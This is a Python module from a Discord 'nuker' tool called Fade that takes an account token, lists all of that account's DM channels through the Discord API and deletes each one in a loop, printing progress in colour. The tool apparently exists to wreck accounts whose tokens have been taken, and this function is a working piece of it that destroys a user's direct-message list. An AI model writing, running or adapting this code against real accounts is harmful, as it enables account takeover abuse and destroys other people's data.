# Fade was proudly coded by Fishy
# Fade Nuker under the GNU General Public Liscense v2 (1991).

import requests
import json
import Fade
from colorama import Fore

from util.plugins.common import clear, print_slow, getheaders, THIS_VERSION

def DmDeleter(token):
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.delete(f'https://discord.com/api/v8/channels/'+channel['id'],
            headers=getheaders(token))
            print(f"{Fore.RED}Deleted DM: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print_slow(f"{Fore.RED}Deleted all available DM's ")
    print("Enter anything to continue. . . ", end="")
    input()
    Fade.main()